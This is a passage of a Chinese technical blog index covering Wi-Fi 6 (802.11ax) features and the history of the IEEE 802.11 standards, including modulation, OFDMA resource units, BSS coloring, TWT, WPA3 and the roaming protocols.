href=\"#上行-MU-MIMO\" class=\"headerlink\" title=\"上行 MU-MIMO\"></a>上行 MU-MIMO</h3><p>UL MU-MIMO（上行）是802.11ax中引入的一个重要特性，UL MU-MIMO的概念和UL SU-MIMO的概念类似，都是通过发射机和接收机多天线技术使用相同的信道资源在多个空间流上同时传输数据，唯一的差别点在于UL MU-MIMO的多个数据流是来自多个用户。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/UL-MIMO.png\" class=\"\">\n\n<p>802.11ac及之前的802.11标准都是UL SU-MIMO，即只能接受一个用户发来的数据，多用户并发场景效率较低，802.11ax支持UL MU-MIMO后，借助UL OFDMA技术（上行），可同时进行MU-MIMO传输和分配不同RU进行多用户多址传输，提升多用户并发场景效率，大大降低了应用时延。</p>\n<h2 id=\"三、更高密度的子载波\"><a href=\"#三、更高密度的子载波\" class=\"headerlink\" title=\"三、更高密度的子载波\"></a>三、更高密度的子载波</h2><p>载波类似于频域上的 Symbol，一个子载波承载一个 Symbol。<br>在Wi-Fi 5及以前（802.11a&#x2F;b&#x2F;g&#x2F;n&#x2F;ac），子载波宽度是312.5KHz。以HT20（20MHz带宽）为例，其被划分为64个子载波，其中52个用于承载数据，4个用于导频，8个作为保护频带。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/subcarrier.png\" class=\"\">\n\n<h3 id=\"时域帧格式\"><a href=\"#时域帧格式\" class=\"headerlink\" title=\"时域帧格式\"></a>时域帧格式</h3><p>802.11ax根据不同的用途，时域可以分为4种帧格式。这四种HE PPDU（Presentation Protocol Data Unit，表示协议数据单元）包括HE SU-PPDU（单用户）、HE MU-PPDU（多用户）、HE Extended Range SU-PPDU（扩展的单用户协议）以及基于Trigger的HE PPDU。<br>高效的前导则包含HE-SIG-A、HE-SIG-B（可选）、HE-STF和HE-LTF。其中HE-LTF主要是用来做信道估计和MIMO检测。</p>\n<h3 id=\"频域资源单位RU\"><a href=\"#频域资源单位RU\" class=\"headerlink\" title=\"频域资源单位RU\"></a>频域资源单位RU</h3><p>对于802.11ax，子载波密度提高了4倍，包含256个子载波，其宽度也缩小为78.125KHz，并基于 OFDMA 模式以 RU 为单位分配频率资源，最小RU为包含26个子载波的2MHz带宽，此外还有52、106、242、484或996数量的子载波。</p>\n<p>下图是20MHz和40MHz带宽的 RU 帧结构图，以最常见的第一行为例，总共256个子载波中，有效子载波为234个（9个包含26个子载波的RU），此外还有首尾11个保护载波 、4个导频载波、7个中央直流载波。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ru.jpeg\" class=\"\">\n\n<blockquote>\n<p>蓝色部分是有效子载波，其它颜色是导频（橙黄色）、直流（DC）和保护子载波（edge）<br>除了信道中央位置的直流载波，资源单位是相邻和连续的</p>\n</blockquote>\n<h2 id=\"四、更高效率的调制编码策略\"><a href=\"#四、更高效率的调制编码策略\" class=\"headerlink\" title=\"四、更高效率的调制编码策略\"></a>四、更高效率的调制编码策略</h2><p>调制编码，分为调制和编码两部分，它们共同决定了单位时间可以同时发送的比特数。其中：</p>\n<ul>\n<li>调制方式：规定每次能够同时发送的比特数，例如BPSK、QPSK、16QAM，64QAM和256QAM</li>\n<li>码率：有用的数据在编码后总数据量中的占比。如果码率是3&#x2F;4，就是指编码后的数据中，3位数据比特 + 1位冗余比特。</li>\n</ul>\n<p>我们一般将调制和编码两部分组合起来分为多个等级，级别越高，数据发送的速率也就越快，这就是调制编码策略 MCS（Modulation Coding Scheme）。<br>802.11ac的基础MSC如下表：</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ac-msc.png\" class=\"\">\n\n<p>802.11ac的常见速率 867Mbps &#x3D; 433.3 Mbps * 2，此时采用 2*2 MIMO，工作在MSC 9模式（80MHz传输带宽、256-QAM调制模式、0.4us保护间隔、5&#x2F;6的编码方式）。</p>\n<p>802.11ax的基础MSC如下表：</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/ax-msc.png\" class=\"\">\n\n<p>上表是基于单流的数据，MIMO速率就是直接乘上通道数量。<br>802.11ax的理论最大速率 9.6Gbps &#x3D; 1201 Mbps * 8，此时采用 8*8 MIMO，工作在MSC 11模式（160MHz传输带宽、1024-QAM调制模式、0.8us保护间隔、5&#x2F;6的编码方式）。</p>\n<h3 id=\"256QAM-–-1024QAM\"><a href=\"#256QAM-–-1024QAM\" class=\"headerlink\" title=\"256QAM –&gt; 1024QAM\"></a>256QAM –&gt; 1024QAM</h3><p>常用的调制方式包括BPSK、QPSK、16QAM，64QAM和256QAM，能同时发送的比特数为1个，2个，4个，6个和8个。<br>802.11ac 协议采用最高 256-QAM 正交幅度调制，即每个符号可以传输 8bit 数据。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/QAM.png\" class=\"\">\n\n<p>802.11ax 协议采用最高 1024-QAM 正交幅度调制，即每个符号可以传输 10bit 数据，10bit&#x2F;8bit&#x3D;1.25，因此相对于 802.11ac 来说，802.11ax 的速率会提升 25%。</p>\n<blockquote>\n<p>高通已提供4096-QAM，理论速率提高20%，也称为MCS12~MCS13，但最大仅支持2*2 MIMO，同时终端支持也非常有限</p>\n</blockquote>\n<h3 id=\"更长的-Symbol-时长-更短的-GI-间隔\"><a href=\"#更长的-Symbol-时长-更短的-GI-间隔\" class=\"headerlink\" title=\"更长的 Symbol 时长 + 更短的 GI 间隔\"></a>更长的 Symbol 时长 + 更短的 GI 间隔</h3><p>Symbol就是时域上的传输信号，相邻的两个Symbol之间需要有一定的空隙（GI），以避免Symbol之间的干扰。就像中国的高铁一样，每列车相当于一个Symbol，同一个车站发出的两列车之间一定要有一个时间间隙，否则两列车就可能会发生碰撞。不同Wi-Fi标准下的间隙也有不同，一般来说传输速率较快时GI需要适当增大，就像同一车道上两列350KM&#x2F;h时速的高铁发车时间间隙要比时速250KM&#x2F;h时速的高铁发车间隙要大一些。</p>\n<p>对于 802.11ac，Symbol的有效传输时长为3.2us，GI 有0.4us 和 0.8us 的两种模式。<br>对于 802.11ax 由于子载波密度提高了4倍，Symbol的有效传输时长提高到 3.2 * 4 &#x3D; 12.8us，GI 提高到 0.8us 和 1.6us。换句话说，Wi-Fi 6 的传输容量提高了4倍，但信号间隔只提高了2倍，因此传输效率又了显著提升。</p>\n<p>在 GI 同为 800ns 的情况下，对于 802.11ac来说：<br>    每个 Symbol 的传输时间为(3.2+0.8)&#x3D;4.0us，有效数据传输时间占比为 3.2&#x2F;4.0&#x3D;0.8，<br>而对于 802.11ax 来说：<br>    每个 Symbol 的传输时间为(12.8+0.8)&#x3D;13.6us，有效数据传输时间占比为 12.8&#x2F;13.6&#x3D;0.94。</p>\n<h2 id=\"五、BSS-Coloring-着色机制\"><a href=\"#五、BSS-Coloring-着色机制\" class=\"headerlink\" title=\"五、BSS Coloring - 着色机制\"></a>五、BSS Coloring - 着色机制</h2><p>Wi-Fi射频的传输原理是在任何指定时间内，一个信道上只允许一个用户传输数据，如果Wi-Fi AP和客户端在同一信道上侦听到有其他802.11无线电传输，则会自动进行冲突避免，推迟传输，因此每个用户都必须轮流使用（这就是CSMA&#x2F;CA的原理）。<br>802.11ac及之前的标准，通常采用动态调整CCA门限的机制来改善同频信道间的干扰，通过识别同频干扰强度，动态调整CCA门限，忽略同频弱干扰信号实现同频并发传输，提升系统吞吐容量。</p>\n<p>Spatial Reuse（空间复用），也被称作“BSS着色”（BSS coloring），通过此技术可以实现更多同步传输，即AP可以识别两个相距不远但并不相邻的AP和终端设备，能够在同一时间内实现无线并发传输而不会相互影响。用于解决不同AP在相同信道下并发冲突的问题。</p>\n<blockquote>\n<p>BSS着色技术来源于 802.11ah，由于其应用的室外场景往往多个AP同时工作，利用BSS染色技术可以快速检测网络环境以减少干扰</p>\n</blockquote>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/obss.jpeg\" class=\"\">\n\n<ul>\n<li>当路由器或设备在发送数据前侦听到信道已被占用时，会首先检查该“占用”的BSS Color（<strong>此处可以看出 BSS Color 是要优先于 MAC address判断的</strong>），确定是否是同一AP的网络，如果不是，则不用避让，从而允许多个AP在同一信道上运行，并智能管理多用户同时并行传输</li>\n<li>采用BSS着色机制，接收端可以及早识别同频传输干扰信号并停止接收，避免浪费收发机时间。如果颜色相同，则认为是同一BSS内的干扰信号，发送将推迟；如果颜色不同，则认为两者之间无干扰，两个Wi-Fi设备可同信道同频并行传输。</li>\n</ul>\n<h2 id=\"六、TWT-目标唤醒时间\"><a href=\"#六、TWT-目标唤醒时间\" class=\"headerlink\" title=\"六、TWT - 目标唤醒时间\"></a>六、TWT - 目标唤醒时间</h2><p>目标唤醒时间（TWT）是802.11ax支持的另一个重要的资源调度功能，它借鉴于<strong>802.11ah</strong>标准。它允许设备协商什么时候和多久会被唤醒，然后发送或接收数据。<br>此外，Wi-Fi AP可以将客户端设备分组到不同的TWT周期，从而减少唤醒后同时竞争无线介质的设备数量。TWT还增加了设备睡眠时间，对采用电池供电的终端来说，大大提高了电池寿命。</p>\n<h2 id=\"七、新的安全标准WPA3\"><a href=\"#七、新的安全标准WPA3\" class=\"headerlink\" title=\"七、新的安全标准WPA3\"></a>七、新的安全标准WPA3</h2><p>面前主流的Wi-Fi安全标准WEP2已经发布20多年了（之前更古老的是WPA和WEP，以及未流行的WAPI），存在许多明显的安全隐患，为此Wi-Fi联盟发布了新的安全标准WPA3，主要特性是：</p>\n<ul>\n<li>建立了 Wi-Fi设备配置协议（DPP），WPA3不需要使用共享密码即可注册新设备，从而摆脱了对屏幕和键盘输入的依赖，特别适用于智能灯泡等物联网设备。实现方式是用户使用二维码或NFC标签，通过拍摄照片或接收来自于路由器的无线电信号，以传输系统访问权限的方式获得相应的网络授权，而非通过屏幕输入密码。</li>\n<li>提供“个性化数据加密”功能，当您连接到开放的Wi-Fi网络时，即使您在连接时未输入密码，设备与Wi-Fi接入点之间的流量也会被加密</li>\n<li>字典攻击不再可用，因为WPA 3安全协议会限制错误密码次数，从而击败基于字典爆破的尝试</li>\n<li>加密强度升到了192位（CNSA标准）</li>\n<li>修正了KRACK（重装密钥攻击）问题</li>\n</ul>\n<p>由于WPA3的实现需要AP和终端设备的共同改造，目前还没有实现大规模的商业普及！</p>\n<h2 id=\"八、小结\"><a href=\"#八、小结\" class=\"headerlink\" title=\"八、小结\"></a>八、小结</h2><img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/phy.png\" class=\"\">\n\n<h2 id=\"九、展望-Wi-Fi-7\"><a href=\"#九、展望-Wi-Fi-7\" class=\"headerlink\" title=\"九、展望 Wi-Fi 7\"></a>九、展望 Wi-Fi 7</h2><p>IEEE 802.11be是计划中802.11 IEEE标准的下一个版本，将会命名为Wi-Fi 7，预计2024年发布。</p>\n<p>候选特性：</p>\n<ul>\n<li><strong>支持全新的6GHz频谱</strong>，并适配相应的监管法规</li>\n<li>支持320MHz的信道宽度，高效地利用充裕的频谱</li>\n<li>支持16个空间流，多输入多输出 (MIMO) 协议改进</li>\n<li>支持全新的 4096-QAM (4K-QAM)</li>\n<li>新的帧格式，改进的前向兼容</li>\n<li>多带宽／多信道聚合运作，对拥塞和频谱和充裕的频谱分别引入 320&#x2F;160+160 MHz 和 240&#x2F;160+80 MHz 带宽，</li>\n<li>接入点 (AP) 间协调（传输协调与联合传输）</li>\n<li>更高级的链路适应和重新传输协议，例如混合自动重请求 (HARQ)</li>\n<li>集成时效性网络 (TSN) 扩展，应对低时延实时流量 (IEEE 802.11aa)</li>\n<li>改进正交频分多址的资源分配</li>\n<li>改进信道探测，降低探测时间，隐式信道探测，更灵活的 preamble puncturing 方法</li>\n<li>对直接链路的支持，由接入点主导</li>\n</ul>\n<h2 id=\"附录：名词解释\"><a href=\"#附录：名词解释\" class=\"headerlink\" title=\"附录：名词解释\"></a>附录：名词解释</h2><table>\n<thead>\n<tr>\n<th>缩略语</th>\n<th>英文全名</th>\n<th>中文解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>OFDMA</td>\n<td>Orthogonal Frequency Division Multiple Access</td>\n<td>正交频分多址接入</td>\n</tr>\n<tr>\n<td>HE</td>\n<td>Hight Efficiency</td>\n<td>高效率</td>\n</tr>\n<tr>\n<td>PPDU</td>\n<td>physical layer (PHY) protocol data unit</td>\n<td>物理层协议数据单元</td>\n</tr>\n<tr>\n<td>RU</td>\n<td>Resource Unit</td>\n<td>资源单元</td>\n</tr>\n<tr>\n<td>OBSS</td>\n<td>Overlapping Basic Service Sets</td>\n<td>重叠基本服务集</td>\n</tr>\n<tr>\n<td>SR</td>\n<td>Spatial Reused</td>\n<td>空间重用</td>\n</tr>\n<tr>\n<td>TWT</td>\n<td>Target Wake Times</td>\n<td>目标唤醒时间</td>\n</tr>\n<tr>\n<td>BPSK</td>\n<td>Binary Phase Shift Keying</td>\n<td>二相相移键控</td>\n</tr>\n<tr>\n<td>QPSK</td>\n<td>Quadrature Phase Shift Keying</td>\n<td>四相相移键控信号</td>\n</tr>\n<tr>\n<td>QAM</td>\n<td>Quadrature Amplitude Modulation</td>\n<td>正交幅度调制 ,16QAM是指包含16种符号的QAM调制方式，256QAM，1024QAM等类似</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/IEEE_802.11\">IEEE 802.11 的 Wiki</a></li>\n<li><a href=\"https://www.intel.cn/content/www/cn/zh/gaming/resources/wifi-6.html\">Intel关于Wifi 6的介绍</a></li>\n<li><a href=\"http://www.semiinsights.com/s/electronic_components/23/38911.shtml\">关于WiFi 6技术，这篇说得最详细</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/373074671\">什么是调制、为什么要调制、调制有哪些？</a></li>\n<li><a href=\"https://www.elettroamici.org/zh/modulazione-digitale/\">数字调制技术的对比分析</a></li>\n<li><a href=\"https://www.ruijie.com.cn/fa/xw-hlw/81858/\">第七代无线技术802.11ax详解</a></li>\n<li><a href=\"https://www.eet-china.com/mp/a44484.html\">Wi-Fi 技术的演进</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/359250747\">WIFI6技术概述</a></li>\n<li><a href=\"https://www.mwrf.net/tech/tm/2021/28003.html\">802.11ax（Wi-Fi 6）技术简介和射频测试</a></li>\n</ul>\n<h3 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h3><ul>\n<li><a href=\"80211ax%E6%8A%80%E6%9C%AF%E7%99%BD%E7%9A%AE%E4%B9%A6.pdf\">IEEE 802.11ax 技术白皮书 - H3C</a></li>\n</ul>\n"},{"title":"Wi-Fi 6的技术专题之二：技术标准","url":"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86/","content":"<p>Wi-Fi背后的技术标准，是由美国的电气电子工程师协会（IEEE）制定的802.11系列协议，主要包含几个物理层（PHY）规范和一个链路层（MAC）规范。</p>\n<blockquote>\n<p>IEEE 802.11的链路层规范为CSMA&#x2F;CA（载波侦听多路访问&#x2F;碰撞避免），与以太网IEEE 802.3的CSMA&#x2F;CD（载波侦听多路访问&#x2F;冲突检测）非常相似</p>\n</blockquote>\n<p>从1997年的第一个版本开始，802.11系列协议不断向前演进，经历了802.11a&#x2F;b&#x2F;g&#x2F;n&#x2F;ac等多个版本，支持的上网速率也不断提升。目前最新的协议版本是802.11ax，也就是近年来迅速发展的Wi-Fi 6。</p>\n<h2 id=\"一、Wi-Fi技术标准的演进\"><a href=\"#一、Wi-Fi技术标准的演进\" class=\"headerlink\" title=\"一、Wi-Fi技术标准的演进\"></a>一、Wi-Fi技术标准的演进</h2><img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86/wifi.png\" class=\"\">\n\n<h3 id=\"IEEE-802-11a-b-g-Wi-FI-1-2-3\"><a href=\"#IEEE-802-11a-b-g-Wi-FI-1-2-3\" class=\"headerlink\" title=\"IEEE 802.11a&#x2F;b&#x2F;g &#x3D; Wi-FI 1&#x2F;2&#x2F;3\"></a>IEEE 802.11a&#x2F;b&#x2F;g &#x3D; Wi-FI 1&#x2F;2&#x2F;3</h3><p>IEEE 802.11<br>创建于1997年，数据传输速率仅有 2Mbps，由于互操作性问题、成本和缺乏足够的吞吐量，该协议未被广泛接受，但它改变了用户的接入方式。</p>\n<p>IEEE 802.11a<br>创建于1999年，首次支持5GHz频段，最大数据速率高达54Mbps。<br>由于各国对于5GHz频段开放存在争议，而且存在覆盖范围小、产品成本高、研发进度慢、与802.11b不兼容等问题而未被广泛接受。</p>\n<p>IEEE 802.11b<br>也在1999年创建的，它使用更典型的2.4GHz频带，并且可以达到11Mbps的最大速度。<br>与IEEE 802.11a实际上形成竞争关系，苹果公司的iBook是第一个搭载Wi-Fi的主流产品。</p>\n<p>IEEE 802.11g<br>发布于2003年，使用与802.11a相同的OFDM技术，同样支持54Mbps的最大理论速率，但改为使用相对可靠的2.4GHz频段。<br>802.11g 向后兼容 802.11b（即 802.11b 设备可以连接到 802.11g 接入点）。</p>\n<h3 id=\"IEEE-802-11n-Wi-Fi-4\"><a href=\"#IEEE-802-11n-Wi-Fi-4\" class=\"headerlink\" title=\"IEEE 802.11n &#x3D; Wi-Fi 4\"></a>IEEE 802.11n &#x3D; Wi-Fi 4</h3><p>2009年发布，多项先进技术的引入让Wi-Fi变得更快、更可靠，也是第一个可以在我国合法使用的Wi-Fi标准，使得Wi-Fi真正成为业界主流技术。</p>\n<ul>\n<li>第一次同时支持2.4GHz频段和5GHz频段</li>\n<li>使用20Mhz或40Mhz信道宽度，最大传输速度理论值为600Mbit&#x2F;s</li>\n<li>初期最高支持64-QAM调制，后期增加对于256-QAM高阶调制的可选支持，使其理论速率达到了最高800Mbit&#x2F;s</li>\n<li>首次引入MIMO（多输入多输出系统），支持波束成形，空间复用等重要功能</li>\n</ul>\n<h3 id=\"IEEE-802-11ac-Wi-Fi-5\"><a href=\"#IEEE-802-11ac-Wi-Fi-5\" class=\"headerlink\" title=\"IEEE 802.11ac &#x3D; Wi-Fi 5\"></a>IEEE 802.11ac &#x3D; Wi-Fi 5</h3><p>2014年推出802.11ac Wave1，2016年推出802.11ac Wave2。</p>\n<ul>\n<li>仅支持5GHz频段，因此<strong>ac双频路由器的2.4GHz部分只能工作在802.11n模式</strong></li>\n<li>大幅提高数据吞吐量，首次支持80MHz信道宽度，单流最高速率可达每秒1300Mbps；理论支持160MHz信道，最高理论速度可达6.77Gbps</li>\n<li>支持256-QAM，支持Multi-User MIMO（仅下行方向，最高8x8 MIMO），路由器可以使用不同的空间流（天线）与不同的设备进行通信</li>\n</ul>\n<h3 id=\"IEEE-802-11ax-Wi-Fi-6\"><a href=\"#IEEE-802-11ax-Wi-Fi-6\" class=\"headerlink\" title=\"IEEE 802.11ax &#x3D; Wi-Fi 6\"></a>IEEE 802.11ax &#x3D; Wi-Fi 6</h3><p>发布于2019年，是当前最新的Wi-Fi技术标准，也是<strong>第一次使用Wi-Fi 6的商业推广名称</strong></p>\n<ul>\n<li>同时工作在2.4GHz与5GHz频段上，向下兼容11a&#x2F;b&#x2F;g&#x2F;n&#x2F;ac，</li>\n<li>支持160MHz信道，最大传输速度理论值为9.6Gbps，标称吞吐量提升4倍，传输速率提升37%，延迟下降75%</li>\n<li>支持1024-QAM，MU-MIMO技术成为标配（最大8x8 MIMO），且同时支持上行与下行</li>\n<li>引入了OFDMA（频分复用技术）、BSS着色机制等先进技术</li>\n</ul>\n<h2 id=\"二、重要的辅助标准\"><a href=\"#二、重要的辅助标准\" class=\"headerlink\" title=\"二、重要的辅助标准\"></a>二、重要的辅助标准</h2><h3 id=\"802-11i-2004-WAP2\"><a href=\"#802-11i-2004-WAP2\" class=\"headerlink\" title=\"802.11i-2004 &#x3D; WAP2\"></a>802.11i-2004 &#x3D; WAP2</h3><p>802.11-1999的基础安全规范（MAC层）采用WEP标准，由于被证明存在安全漏洞，2004年发布了<a href=\"https://en.wikipedia.org/wiki/IEEE_802.11i-2004\">IEEE 802.11i-2004</a>，Wi-Fi联盟称为WAP2，这也是现在的主流方案。<br>其核心技术是四次握手和组密钥（GTK）握手，初始身份验证过程使用预共享密钥(PSK) 或通过 802.1X进行EAP交换后执行，采用AES加密算法。</p>\n<blockquote>\n<p>2003年，中国制定了一个与IEEE 802.11i存在较大差异的无线局域网国家标准WAPI，并积极推动纳入ISO规范标准……<br>经过漫长的中美贸易争端谈判，2011年中国政府申请撤回WAPI标准提案。</p>\n</blockquote>\n<h3 id=\"802-11h-Auto-DFS-Auto-TPC\"><a href=\"#802-11h-Auto-DFS-Auto-TPC\" class=\"headerlink\" title=\"802.11h &#x3D; Auto DFS + Auto TPC\"></a>802.11h &#x3D; Auto DFS + Auto TPC</h3><p>在频率规划中已经提到，本规范旨在引入两个主要特征：动态频率选择(DFS)和发射功率控制(TPC)。</p>\n<p>DFS作为频谱管理（主要与雷达协作）和TPC，用于限制无线设备的整体射频“污染”。<br>DFS通常与Mesh关联，但它只与室外（甚至室内区域听到室外信号并在室内&#x2F;室外信道上运行）相关。<br>由于2.4Ghz频段没有雷达，因此DFS规则仅适用于5GHz频段。</p>\n<h3 id=\"802-11k-v-r-无线Mesh\"><a href=\"#802-11k-v-r-无线Mesh\" class=\"headerlink\" title=\"802.11k&#x2F;v&#x2F;r &#x3D; 无线Mesh\"></a>802.11k&#x2F;v&#x2F;r &#x3D; 无线Mesh</h3><p>为实现Wi-Fi无缝漫游而定义的一组协议，通常简写为802.11k&#x2F;v&#x2F;r，所谓的MESH路由器就是依靠这三个协议实现不同的路由器节点之间的漫游。</p>\n<ul>\n<li>802.11k：拓扑感知的基础协议，负责测量附近节点的无线电资源信息并告知客户端，帮助客户端实现BBS切换，核心数据是邻近AP节点列表</li>\n<li>802.11v：漫游切换的核心协议，负责多个BBS的切换管理，通过算法协议让信号不好的终端设备更换AP</li>\n<li>802.11r：快速认证的辅助协议，负责网络切换时的快速认证方法，减少客户端切换节点的等待时间，尽量不让用户感觉到切换节点</li>\n</ul>\n<p>需要注意的是，节点AP和终端设备必须都支持k&#x2F;v&#x2F;r协议时，漫游功能才能实现。<br>苹果终端设备从iphone4s开始就支持这三个协议，三星终端设备从2019年开始支持。<br>许多低端路由器只支持K和V这两个协议，并不支持R协议，但其事实上并不影响漫游切换，仅是切换时长略长一些（60ms左右）。</p>\n<h2 id=\"三、几个另类的技术标准\"><a href=\"#三、几个另类的技术标准\" class=\"headerlink\" title=\"三、几个另类的技术标准\"></a>三、几个另类的技术标准</h2><p>Wi-Fi技术在局域网领域的巨大成功，也催生Wi-Fi联盟试图在相关领域的积极拓展，一是从室内走向室外，二是从网络设备走向终端设备。</p>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86/ieee.jpg\" class=\"\">\n\n<h3 id=\"802-11af-广域网\"><a href=\"#802-11af-广域网\" class=\"headerlink\" title=\"802.11af &#x3D; 广域网\"></a>802.11af &#x3D; 广域网</h3><p>802.11af也被称为超级Wi-Fi或White-Fi，是一个面向长距离通信服务的协议，主要特点是：</p>\n<ul>\n<li>希望利用电视VHF与UHF两个频段中没有使用的部分空白频谱资源，授予无线宽带网络使用，由于频率较低，信号干扰较少，可以支持数公里范围的传输</li>\n<li>物理层基于802.11ac，同样支持OFDM技术</li>\n<li>采用6-8Mhz的频率带宽，提供26.7-35.6Mbps的无线网络传输速率</li>\n</ul>\n<p>美国FCC提出的“超级Wi-Fi网络”的提案，遭到AT&amp;T、T-Mobile、Verizon、英特尔、高通等专注于移动通信的公司，以及电视广播业和使用无线麦克风等行业的强烈反对，其理由为“超级Wi-Fi网络”的管理存在问题，容易在大城市中出现网络拥堵的状况。同时，“超级Wi-Fi网络”干扰的问题还没有得到解决，将会影响移动通信行业收入。</p>\n<h3 id=\"802-11ah-物联网\"><a href=\"#802-11ah-物联网\" class=\"headerlink\" title=\"802.11ah &#x3D; 物联网\"></a>802.11ah &#x3D; 物联网</h3><p>802.11ah是一个为物联网IoT场景设计的专项协议，主要特点是：</p>\n<ul>\n<li>面向“大连接”，强调节能低功耗，速率较低（150Kps-18Mbps）</li>\n<li>设计工作在900MHz频段，由于该频段需要政府许可，商用难度很高</li>\n</ul>\n<p>802.11ah是协议组的命名，而HaLow是Wi-Fi联盟对于802.11ah协议的命名。HaLow这个命名其实算是非常不错的，有几种说法：<br>1）Low代表的是低功耗，而Ha可以代表”Hay-“或者”Halo”。<br>2）HaLow整体的命名接近于Hello，比较好记。<br>3）Ha还有一种意思可以理解，就是其是倒过来的aH，也就是代表了802.11ah。</p>\n<h3 id=\"802-11ad-802-11ay-无线硬盘\"><a href=\"#802-11ad-802-11ay-无线硬盘\" class=\"headerlink\" title=\"802.11ad &amp; 802.11ay &#x3D; 无线硬盘\"></a>802.11ad &amp; 802.11ay &#x3D; 无线硬盘</h3><p>这两个标准一脉相承，目标是室内的高速数据传输，例如高清视频播放等，基本特点是：</p>\n<ul>\n<li>基于60GHz的毫米波技术，支持高达7Gbps的传输速率</li>\n<li>由于采用高频段，信号不能穿透墙壁，并且要求直线传输</li>\n<li>多千兆无线系统（MGWS）标准，并且是WiGig网络的网络标准。因为它使用了V精密带的毫米波（MMW）频率</li>\n</ul>\n<p>IEEE 802.11ay是802.11ad的后继版本，引入MIMO技术与通道捆合技术(Channel Bonding)机制，并支援更高阶的调变机制(最高可达256-QAM)。</p>\n<p>2018年，高通公司宣布推出业界首款基于新的WiGig标准802.11ay的60GHz Wi－Fi解决方案，可以提供实现游戏和娱乐新体验，例如4K流媒体直播、无延迟移动屏幕投射到娱乐系统以及真正身临其境的无线虚拟和增强现实体验。</p>\n<h2 id=\"附录一：802-11的PHY（物理层）规范\"><a href=\"#附录一：802-11的PHY（物理层）规范\" class=\"headerlink\" title=\"附录一：802.11的PHY（物理层）规范\"></a>附录一：802.11的PHY（物理层）规范</h2><p>在描述Wi-Fi的信道速率时，经常看到HE160、VHT80等名词，其实这是802.11标准中关于PHY规范的名称，对应着Wi-Fi等各个标准。</p>\n<ul>\n<li><strong>HT &#x3D; 802.11n</strong>：2009年发布，规范名称为“High-throughput (HT) PHY specification”，即：高吞吐量（HT）PHY规范，定义了20MHz、40MHz等2种模式，最大2条流，调制方式为 MIMO-OFDM</li>\n<li><strong>VHT &#x3D; 802.11ac</strong>：2013年发布，规范名称为“Very high throughput (VHT) PHY specification”，，即：超高吞吐量（VHT）PHY规范定义了20MHz、40MHz、80MHz、160MHz、80MHz+80MHz等5种模式，最大8条流，调制方式为 MIMO-OFDM，不支持2.4GHz频段</li>\n<li><strong>HE &#x3D; 802.11ax</strong>，2020年发布，规范名称为“High Efficiency(HE) PHY specification”，即：高效（HE）PHY规范，定义了20MHz、40MHz、80MHz、160MHz等4种模式，最大8条流，调制方式为OFDMA</li>\n</ul>\n<p>此外，还有几个有意思的PHY规范：</p>\n<ul>\n<li><strong>DMG &#x3D; 802.11ad</strong>：2012年发布，对应规范为“Directional multi-gigabit (DMG) PHY specification”，即：定向多吉比特（DMG）PHY规范，工作在60GHz频段，不支持多流，调制方式为 OFDM，单载波，低功耗单载波。</li>\n<li><strong>TVHT &#x3D; 802.11af</strong>：2014年发布，对应规范为“Television very high throughput (TVHT) PHY specification”，即：电视超高吞吐量（TVHT）PHY规范，工作在电视的空白频段，最大4条流，调制方式为 MIMO-OFDM</li>\n</ul>\n<h2 id=\"附录二：以太网标准-IEEE-802-3\"><a href=\"#附录二：以太网标准-IEEE-802-3\" class=\"headerlink\" title=\"附录二：以太网标准 IEEE 802.3\"></a>附录二：以太网标准 IEEE 802.3</h2><p>IEEE 802.3标准是由Ethernet V2发展而来。它将Ethernet V2帧头的协议类型字段替换为帧长度字段，并加入802.2 